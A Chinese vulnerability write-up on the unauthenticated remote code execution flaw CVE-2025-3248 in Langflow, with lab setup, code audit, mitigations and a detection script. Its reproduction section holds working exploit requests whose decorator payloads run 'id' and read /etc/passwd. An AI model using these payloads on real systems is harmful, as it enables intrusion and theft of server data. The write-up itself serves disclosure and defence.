# 1、漏洞信息

​	LangFlow 是一款开源的低代码、可视化 AI 应用构建工具，基于 Python 开发，通过拖拽式界面让用户能够快速搭建复杂的 AI 工作流，支持多代理编排、Python 自定义以及多种预构建组件和模板。它还提供即时测试、API 发布等功能，适用于构建聊天机器人、文档分析和内容生成等应用，支持云部署或本地运行，适合快速验证创意和轻量级解决方案。



​	在1.3.0版本之前，Langflow 的`/api/v1/validate/code`接口原本用来校验用户提交的Python代码是否合法，其内部通过`ast`解析代码后，使用`exec`执行所有函数定义。然而，Python的装饰器和默认参数表达式也会在函数定义时被执行，攻击者可以通过精心构造的装饰器或默认参数，在未授权的情况下实现任意代码执行。



# 2、漏洞概述

| 漏洞名称  | Langflow 远程代码执行漏洞                      |
| --------- | ---------------------------------------------- |
| 漏洞等级  | 高危                                           |
| CVE编号   | CVE-2025-3248                                  |
| CNVD编号  | 暂无                                           |
| CNNVD编号 | 暂无                                           |
| 其他编号  | 暂无                                           |
| 披露时间  | 2025-04-06                                     |
| 分数      | 9.8                                            |
| CVSS      | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H   |
| 披露链接  | https://www.cve.org/CVERecord?id=CVE-2025-3248 |



# 3、影响范围

```
Langflow < 1.3.0
```



# 4、环境搭建

```
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/langflow/CVE-2025-3248/
docker compose up -d
```



# 5、代码审计

漏洞的成因在于 Langflow 的 `/api/v1/validate/code` 接口存在设计缺陷。具体来说：

- **未进行身份验证**：`post_validate_code` 方法未对调用该接口的用户身份进行校验，这意味着任何未经身份验证的攻击者都可以通过 HTTP 请求访问该接口。

- **直接执行用户输入代码**：该方法直接调用了 `langflow.utils.validate.validate_code` 函数来运行用户传入的代码。由于没有对用户输入进行适当的过滤或限制，攻击者可以利用这一缺陷，通过构造恶意代码注入到接口中，从而在服务器上执行任意代码。

- **代码执行环境未隔离**：`validate_code` 函数在执行用户代码时，没有将执行环境与服务器的主环境隔离。这使得攻击者可以利用该漏洞执行系统命令、访问敏感文件或篡改服务器配置等操作。



https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/api/v1/validate.py

![image-20250506150127387](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202505061502876.png)



# 6、漏洞复现

直接向`/api/v1/validate/code`接口发送包含恶意装饰器的Python函数定义，即可来实现远程命令执行

```
POST /api/v1/validate/code HTTP/1.1
Host: 192.168.91.135:7860
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 105

{"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n pass"}
```

![image-20250506154731844](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202505061547004.png)



```
POST /api/v1/validate/code HTTP/1.1
Host: 192.168.91.135:7860
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 105

{"code": "@exec(\"raise Exception(__import__('subprocess').check_output(['cat','/etc/passwd']))\")\ndef foo():\n pass"}
```

![image-20250506154812010](https://cdn.jsdelivr.net/gh/xmtxsec/picture/imgl/202505061548125.png)



# 7、解决方案

## 7.1、临时缓解方案

如果暂时无法升级，可以采取以下措施降低风险：

- **添加身份验证**：确保只有经过身份验证的用户才能调用 `/api/v1/validate/code` 接口。
- **限制代码执行范围**：对用户输入的代码进行严格的过滤和限制，避免执行危险操作。
- **隔离代码执行环境**：使用沙箱环境（如 Python 的 `exec` 函数配合 `restricted_eval` 或其他安全机制）来执行用户代码，防止恶意代码影响服务器的主环境。



## 7.2、升级修复方案

**版本更新**：官方已发布升级补丁。



# 8、POC

```python
import requests  
  
code = "cmd"  
response = requests.post("http://127.0.0.1:7860/api/v1/validate/code",  
json={"code": code},  
headers={"Authorization": "Bearer no"})  
  
if response.status_code == 401:  
print("身份验证存在,不存在漏洞")  
else:  
print("身份验证不存在，可能存在漏洞")  
print(response.text)
```



# 9、参考链接

- https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
- https://github.com/langflow-ai/langflow/releases/tag/1.3.0
- https://github.com/langflow-ai/langflow/pull/6911

